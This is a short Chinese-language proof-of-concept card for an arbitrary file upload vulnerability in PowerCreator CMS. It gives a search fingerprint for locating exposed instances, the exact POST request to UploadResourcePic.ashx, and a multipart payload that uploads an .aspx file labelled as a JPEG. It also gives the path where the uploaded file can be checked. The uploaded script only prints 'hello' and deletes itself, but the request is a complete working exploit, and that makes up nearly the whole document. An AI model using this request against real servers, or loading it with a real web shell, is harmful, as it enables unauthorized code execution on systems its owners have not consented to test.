# PowerCreatorCMSUploadResourcePic任意文件上传漏洞

- **系统**：PowerCreatorCMSUploadResourcePic　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="PowerCreator-CMS"`
- **请求**：`POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------208…`

**请求体 / payload**
```
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="qaz.aspx"
Content-Type: image/jpeg
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
-----------------------------20873900192357278038549710136--
验证地址：/ResourcePic/ODM4Mg==.ASPX
```
- **预期**：200　|　—